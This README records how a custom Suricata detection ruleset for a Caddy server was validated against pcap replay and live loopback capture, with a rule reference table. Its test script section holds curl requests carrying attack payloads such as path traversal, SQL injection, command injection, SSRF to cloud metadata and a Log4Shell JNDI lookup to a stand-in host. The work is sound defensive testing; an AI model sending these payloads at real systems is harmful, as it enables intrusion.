# Suricata + Caddy Rules - Testing Notes

This folder holds a custom Suricata ruleset written for a Caddy web server (`caddy.rules`), plus everything used to test it: a saved pcap, a traffic generator script, and a raw log of every command run while figuring this out (`suricata-testing.txt`), which is obviously not in this repo lol :).

This README is the clean version of that log. It covers install, how the rules were validated, how the test pcap was made, how detection was checked both offline (pcap replay) and live (real interface capture), and every mistake hit along the way so the same ones don't happen twice.

## What's in this folder

- `caddy.rules` - 29 detection rules for Caddy, covering things like path traversal, SQL injection, XSS, Log4Shell, SSRF, brute force on login endpoints, and dangerous file uploads.
- `attack_traffic.sh` - a script that fires one request per rule (plus the frequency-based ones) at a target so you can prove each signature actually fires.

## 1. Installing Suricata (Kali / Debian based)

```bash
sudo apt update
sudo apt install suricata -y
suricata --build-info | head -n 5
```

Check the config file location and default log directory:

```bash
cat /etc/suricata/suricata.yaml | grep -i default-log-dir
```

On this box it's `/var/log/suricata/`. Keep that in mind, it comes up later.

## 2. Checking the rules load correctly

Before doing anything with traffic, check that Suricata can actually parse the rule file. The `-T` flag runs Suricata in test mode, it loads the config and rules, then exits without capturing anything.

```bash
suricata -T -c /etc/suricata/suricata.yaml -S /path/to/suricata/caddy.rules -v
```

First attempt without `sudo` failed:

```
Error: suricata: The logging directory "/var/log/suricata/" supplied by /etc/suricata/suricata.yaml (default-log-dir) is not writable. Shutting down the engine
```

Suricata still needs to open its log files even in test mode, and a normal user can't write to `/var/log/suricata/`. Fix is simple, just run it with `sudo`:

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -S /path/to/suricata/caddy.rules -v
```

That's basically the standard pattern for this whole project: try it plain first, if it complains about permissions, add `sudo`.

### The duplicate SID bug

At one point the rule file had two Log4Shell rules (one checking the URI, one checking headers) both using `sid:996012`. Suricata will not load two signatures with the same SID:

```
Error: detect-parse: Duplicate signature "...sid:996012b..."
Error: detect: error parsing signature "...sid:996012b..." from file .../caddy.rules at line 55
Info: detect: 1 rule files processed. 28 rules successfully loaded, 1 rules failed, 0 rules skipped
Error: suricata: Loading signatures failed.
```

Fix: give the second rule its own unique SID (`996033`), keeping it in the same 996xxx numbering range as the rest of the ruleset. After that fix, `-T` reported all 29 rules loading clean:

```
Info: detect: 1 rule files processed. 29 rules successfully loaded, 0 rules failed, 0 rules skipped
Info: detect: 29 signatures processed. 0 are IP-only rules, 0 are inspecting packet payload, 29 inspect application layer, 0 are decoder event only
Notice: suricata: Configuration provided was successfully loaded. Exiting.
```

## 3. Building a test pcap

The idea: stand up a fake web server, capture the traffic while sending attack-style requests at it, and save that capture so it can be replayed against Suricata any time without needing to regenerate traffic.

### Installing tcpdump

Kali usually has it preinstalled, but if not:

```bash
sudo apt update
sudo apt install tcpdump -y
tcpdump --version
```

### Picking the right interface

Check which interfaces are available before you start capturing:

```bash
tcpdump -D
```

or

```bash
ip a
```

If your client and server are both on the same machine (which is the case in this setup, curl and the python server both running on the same Kali box), the traffic goes over `lo` (loopback), not `eth0`. Same reasoning as the live capture section further down: same-machine traffic never actually touches a real NIC.

**Terminal 1, start a target server:**

```bash
python3 -m http.server 8080
```

Any server works here, this is just something to send requests at. A python http.server is enough since Suricata inspects the HTTP request itself, it doesn't care what the server does with it.

**Terminal 2, capture the traffic:**

```bash
sudo tcpdump -i lo -w caddy_test.pcap port 8080
```

What each part does:

- `-i lo` - capture on the loopback interface, since this is same machine traffic
- `-w caddy_test.pcap` - write the raw packets to this file instead of just printing them to the screen
- `port 8080` - a filter, only capture traffic on port 8080, so you don't pick up unrelated noise from the rest of the system

Leave this running, then go fire the attack traffic from terminal 3. Once it's done, come back here and press Ctrl+C to stop the capture. You'll see a summary like:

```
756 packets captured
1512 packets received by filter
0 packets dropped by kernel
```

### Checking the pcap actually has something in it

Before moving on, it's worth a quick sanity check that the file isn't empty or corrupted:

```bash
tcpdump -r caddy_test.pcap -c 10
```

This reads back the first 10 packets from the file and prints them, just to confirm there's real traffic in there. If you have `capinfos` installed (comes with wireshark/tshark), it gives a cleaner summary:

```bash
capinfos caddy_test.pcap
```

**Terminal 3, send the attack requests:**

```bash
curl -s "http://localhost:8080/../../etc/passwd"                                    # path traversal
curl -s "http://localhost:8080/?id=1 UNION SELECT 1,2,3--"                          # sqli
curl -s "http://localhost:8080/wp-admin"                                            # sensitive path
curl -s "http://localhost:8080/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"              # xss
curl -s "http://localhost:8080/?x=%7Cwhoami"                                        # command injection
curl -s -A "sqlmap/1.7" "http://localhost:8080/"                                    # scanner user agent
curl -s -X TRACE "http://localhost:8080/"                                           # trace method
curl -s "http://localhost:8080/?x=\${jndi:ldap://attacker.com/a}"                   # log4shell
curl -s "http://localhost:8080/wp-config.php"                                       # sensitive file
curl -s "http://localhost:8080/id_rsa"                                              # credential file
curl -s "http://localhost:8080/database.sql"                                        # backup file
curl -s "http://localhost:8080/.git/config"                                         # source control
curl -s "http://localhost:8080/error.log"                                           # log file
curl -s "http://localhost:8080/passwords.txt"                                       # suspicious filename
curl -s "http://localhost:8080/login"                                               # auth endpoint
curl -s "http://localhost:8080/..%c0%ae/etc/passwd"                                 # encoding evasion
curl -s "http://localhost:8080/?file=php://filter/resource=index.php"               # lfi
curl -s "http://localhost:8080/?url=http://169.254.169.254/latest/meta-data/"       # ssrf
curl -s "http://localhost:8080/graphql?query=__schema{types{name}}"                 # graphql probe
curl -s -X DEBUG "http://localhost:8080/"                                           # dangerous method
curl -s -A "[]" "http://localhost:8080/"                                            # suspicious user agent
curl -s -X POST "http://localhost:8080/uploads/shell.php"                           # dangerous upload
curl -s "http://localhost:8080/$(python3 -c 'print("A"*1001)')"                     # oversized uri
curl -s -X POST "http://localhost:8080/uploads/shell.php.jpg"                       # double extension upload
curl -s -X POST "http://localhost:8080/uploads/malware.docm"                        # archive upload

# frequency based rules need repeated hits within a time window to cross their threshold
for i in $(seq 1 11); do curl -s "http://localhost:8080/wp-admin"; done             # dir enum (needs 10 in 60s)
for i in $(seq 1 9);  do curl -s "http://localhost:8080/../../etc/passwd"; done     # traversal flood (needs 8 in 60s)
for i in $(seq 1 11); do curl -s "http://localhost:8080/login"; done                # brute force (needs 10 in 60s)
```

Stop the tcpdump with Ctrl+C once traffic finishes. It reported:

```
756 packets captured
1512 packets received by filter
0 packets dropped by kernel
```

This first attempt (see below for the corrected version) was missing 5 detections because of some curl quirks nobody thinks about until they bite you. Details are in the [Curl gotchas](#5-curl-gotchas-found-the-hard-way) section further down.

## 4. Replaying the pcap against Suricata

This is the offline test, feed the saved pcap back into Suricata and see what fires, without needing a live server or live traffic.

```bash
suricata -r caddy_test.pcap -S /path/to/suricata/caddy.rules -l /tmp/suricata-output/ -k none
```

First run failed:

```
Error: suricata: The logging directory "/tmp/suricata-output/" supplied at the command-line (-l /tmp/suricata-output/) doesn't exist. Shutting down the engine.
```

Suricata will not create the log folder for you, `mkdir` it first, then run again (with `sudo`, since reading the pcap and writing logs usually needs it):

```bash
mkdir -p /tmp/suricata-output/
sudo suricata -r caddy_test.pcap -S /path/to/suricata/caddy.rules -l /tmp/suricata-output/ -k none
```

Note on `-k none`: this tells Suricata to skip checksum validation. Loopback-captured packets often have invalid or zero checksums since the kernel skips real checksum calculation for local traffic, so without `-k none` Suricata may treat those packets as corrupt and drop them from inspection.

Output:

```
i: threads: Threads created -> RX: 1 W: 4 FM: 1 FR: 1   Engine started.
i: suricata: Signal Received.  Stopping engine.
i: pcap: read 1 file, 756 packets, 115675 bytes
```

Check the alerts:

```bash
cat /tmp/suricata-output/fast.log
```

`fast.log` is a plain text, one-line-per-alert summary. Good for a quick look.

### Reading eve.json properly

`eve.json` is the detailed JSON log, but it's **JSON Lines** format, one JSON object per line, not one big JSON document. Piping the whole file into `python3 -m json.tool` will fail:

```
Extra data: line 2 column 1 (char 990)
```

That's expected, not a bug. Parse it line by line instead. Easiest way is `jq`:

```bash
jq -c 'select(.event_type=="alert") | {msg: .alert.signature, src_ip, dest_ip}' /tmp/suricata-output/eve.json
```

Or in plain python:

```bash
python3 -c "
import json
for line in open('/tmp/suricata-output/eve.json'):
    e = json.loads(line)
    if e.get('event_type') == 'alert':
        print(e['alert']['signature'], e['src_ip'], '->', e['dest_ip'])
"
```

To count how many times each signature fired:

```bash
grep -o '"signature":"Caddy[^"]*"' /tmp/suricata-output/eve.json | sort | uniq -c
```

(use `sudo` if the file was written by root)

## 5. Live capture on an interface

Testing against a saved pcap only proves the rules are written correctly. It doesn't prove Suricata can catch the same thing while actually watching a live interface. That's a separate test.

First attempt, straight onto the machine's real interface:

```bash
sudo suricata -c /etc/suricata/suricata.yaml -S /path/to/suricata/caddy.rules -i eth0
```

This ran fine but caught 0 packets:

```
i: device: eth0: packets: 0, drops: 0 (0.00%), invalid chksum: 0
```

That's expected, not a fault in the setup. On Linux, traffic from a program to its own machine (even to the machine's real IP, not just `127.0.0.1`) is routed internally through the `lo` device. It never actually goes out through the `eth0` driver, so a capture on `eth0` will never see it.

Two ways to actually test live capture properly:

**A) Capture on `lo` instead**, since that's where same-machine traffic really flows:

```bash
sudo suricata -c /etc/suricata/suricata.yaml -S /path/to/suricata/caddy.rules -i lo
```

You'll likely see a warning like this, it's harmless:

```
W: ioctl: lo: failed to set SIOCETHTOOL ioctl: Operation not supported
```

Loopback doesn't support the ethtool ioctl Suricata tries to call on real NICs. It doesn't affect capture or detection at all.

**B) Or use a second machine on the network** to send the requests at this box's real IP, while Suricata watches `eth0`. That's the only way to genuinely test the `eth0` path, since it forces traffic to actually leave and re-enter through the real interface.

### The three terminal loop

This is the repeatable pattern used to prove live detection works, same idea as the pcap test but with everything happening in real time instead of pre-recorded.

**Terminal 1, the target:**

```bash
python3 -m http.server 8080
```

**Terminal 2, Suricata watching the interface:**

```bash
sudo suricata -c /etc/suricata/suricata.yaml -S /path/to/suricata/caddy.rules -i lo
```

**Terminal 3, fire the traffic:**

```bash
./attack_traffic.sh
```

Once traffic finishes, Ctrl+C terminal 2 to stop Suricata cleanly, then check the alerts. Since no `-l` flag was given this time, logs go to the default log dir set in `suricata.yaml` (`/var/log/suricata/` on this box), not `/tmp/suricata-output/`. Easy to mix these two up if you're jumping between the pcap test and the live test, always double check which log file you're actually reading.

```bash
sudo grep -o '"signature":"Caddy[^"]*"' /var/log/suricata/eve.json | sort | uniq -c
```

If you want a clean count on the next run instead of numbers piling up across sessions:

```bash
sudo truncate -s 0 /var/log/suricata/eve.json /var/log/suricata/fast.log
```

## 6. attack_traffic.sh

Rather than retyping the same block of curl commands every time, they're saved as a script. It takes an optional target, defaulting to the local test server:

```bash
chmod +x attack_traffic.sh
./attack_traffic.sh                       # hits localhost:8080
./attack_traffic.sh 192.168.1.50:8080     # hits a different host, e.g. for the eth0 test from another machine
```

It runs one request per rule, then three loops at the end for the frequency-based rules (directory enumeration, traversal flood, brute force), which only fire once enough hits land inside their time window.

## 7. Curl gotchas found the hard way

The first version of the attack script had 5 rules that never fired, in both the pcap test and the live test. It wasn't a rules problem, it was curl quietly changing the request before it even left the machine. Comparing what was typed against what the target server actually logged made this obvious.

| Rule | What was typed | What curl actually sent | Why | Fix |
|---|---|---|---|---|
| Path Traversal (`996003`) | `/../../etc/passwd` | `/etc/passwd` | curl normalizes `../` out of URLs by default | add `--path-as-is` |
| Traversal Flood (`996019`) | same as above, repeated | same as above | same reason | same fix |
| SQL Injection (`996004`) | `/?id=1 UNION SELECT 1,2,3--` | never reached the server | a raw space in a URL breaks curl's request | percent-encode the space as `%20` |
| Log4Shell (`996012`) | `/?x=${jndi:ldap://attacker.com/a}` | `/?x=$jndi:ldap://attacker.com/a` (braces stripped) | curl treats `{ }` as URL globbing syntax and expands/strips it | add `-g` (`--globoff`) to turn that off |
| GraphQL Probe (`996026`) | `/graphql?query=__schema{types{name}}` | never reached the server | nested `{ }` broke curl's glob parser entirely | add `-g` |

The easiest way to catch this kind of thing is to just read the target server's own access log right after sending a request and compare it to what you typed. If they don't match, something rewrote the request before it left the client.

### The missing 29th rule

After fixing those four, 28 of 29 rules were firing but Suricata still said 29 rules loaded. The last one, `996033` (the Log4Shell header variant added to fix the duplicate SID issue), checks `http.header` instead of the URI. None of the test traffic put a JNDI string inside a header, only in the URI, so it never had a reason to fire. Added one more line to the script to cover it:

```bash
curl -s -H "User-Agent: \${jndi:ldap://attacker.com/a}" "http://localhost:8080/" > /dev/null
```

After that, all 29 signatures fire cleanly on both the pcap replay and the live `-i lo` capture.

## 8. Rule reference

| SID | Name | What it catches |
|---|---|---|
| 996003 | Path Traversal Attempt | `../` sequences and encoded variants in the URI |
| 996004 | SQL Injection Attempt | UNION/SELECT/INSERT/DROP patterns, classic `' OR 1=1` style payloads |
| 996005 | Sensitive Path Probe | requests for `.env`, `.git`, `wp-admin`, `phpmyadmin`, admin/config pages |
| 996008 | XSS Attempt in URI | `<script>`, `javascript:`, `onerror=`, inline JS handlers |
| 996009 | Command Injection Attempt | pipe/backtick characters followed by shell commands |
| 996010 | Known Scanner or Attack Tool User-Agent | sqlmap, nikto, nmap, nuclei, gobuster, and similar tool signatures |
| 996011 | HTTP TRACE or TRACK Method | TRACE/TRACK methods, used for cross site tracing attacks |
| 996012 | Log4Shell JNDI Injection in URI | `${jndi:...}` in the URI |
| 996033 | Log4Shell JNDI Injection in Request Headers | `${jndi:...}` in any request header |
| 996013 | Sensitive File Access Attempt | xmlrpc.php, .htaccess, wp-config.php, /etc/shadow, and similar |
| 996014 | Credential or Private Key File Access | id_rsa, .env, credentials.json, .pem/.key files |
| 996015 | Backup or Database Dump File Access | .bak, .sql, .dump, .tar.gz and similar extensions |
| 996016 | Source Control Artifact Access | .git, .svn, .hg folders and files |
| 996017 | Application Log File Access | error.log, access.log, debug.log and similar |
| 996018 | Directory Enumeration Detected | 10+ sensitive path probes from the same source within 60s |
| 996019 | Aggressive Scanning Repeated Path Traversal | 8+ path traversal attempts from the same source within 60s |
| 996020 | Request for Suspicious Filename | filenames containing password, secret, token, apikey, etc |
| 996021 | Authentication Endpoint Access | login, signin, auth, wp-login.php, oauth/token, etc |
| 996022 | Possible Brute Force on Auth Endpoint | 10+ hits on an auth endpoint from the same source within 60s |
| 996023 | Encoding Evasion or WAF Bypass Attempt | overlong UTF-8 and unusual encodings used to sneak past filters |
| 996024 | LFI or RFI File Inclusion Attempt | php://, phar://, file://, gopher://, and similar wrapper schemes |
| 996025 | SSRF Attempt Targeting Internal Resource | cloud metadata IPs, internal/private IP ranges in a URL parameter |
| 996026 | GraphQL Introspection or API Schema Probe | /graphql, __schema, __type, introspection queries |
| 996027 | Unusual or Dangerous HTTP Method | CONNECT, DEBUG, PROPFIND, MKCOL, and other non standard methods |
| 996028 | Suspicious User-Agent Empty or Oversized | blank, placeholder (`[]`, `''`, `-`), or unusually long User-Agent |
| 996029 | Dangerous File Upload Attempt | uploads ending in .php, .asp, .jsp, .exe, .sh, and similar |
| 996030 | Oversized URI Possible Fuzzing | URIs over 1000 characters long |
| 996031 | Double Extension Upload Bypass Attempt | uploads like shell.php.jpg used to slip past extension checks |
| 996032 | Archive or Macro-Enabled File Upload | .zip, .rar, .docm, .xlsm and similar uploads |

## 9. Quick command cheat sheet

```bash
# check rule syntax without capturing anything
sudo suricata -T -c /etc/suricata/suricata.yaml -S caddy.rules -v

# replay a saved pcap
mkdir -p /tmp/suricata-output/
sudo suricata -r caddy_test.pcap -S caddy.rules -l /tmp/suricata-output/ -k none

# live capture on loopback (same machine testing)
sudo suricata -c /etc/suricata/suricata.yaml -S caddy.rules -i lo

# live capture on a real interface (needs traffic from another host)
sudo suricata -c /etc/suricata/suricata.yaml -S caddy.rules -i eth0

# fire all the test attacks at a target
./attack_traffic.sh [host:port]

# read alerts
cat /tmp/suricata-output/fast.log
jq -c 'select(.event_type=="alert") | {msg: .alert.signature, src_ip, dest_ip}' /tmp/suricata-output/eve.json
grep -o '"signature":"Caddy[^"]*"' /tmp/suricata-output/eve.json | sort | uniq -c
```

## 10. What's left / next steps

- Everything above proves detection works both offline (pcap) and live (interface capture), and that every one of the 29 rules can be triggered on demand.
- Not yet tested: feeding these alerts into Wazuh (this ruleset was written to mirror Wazuh's own rule categories, so the next step is wiring Suricata's eve.json into the Wazuh agent and confirming alerts show up there too).
- Not yet tested: real `eth0` capture from a second machine on the network, only the loopback path has been proven live so far.
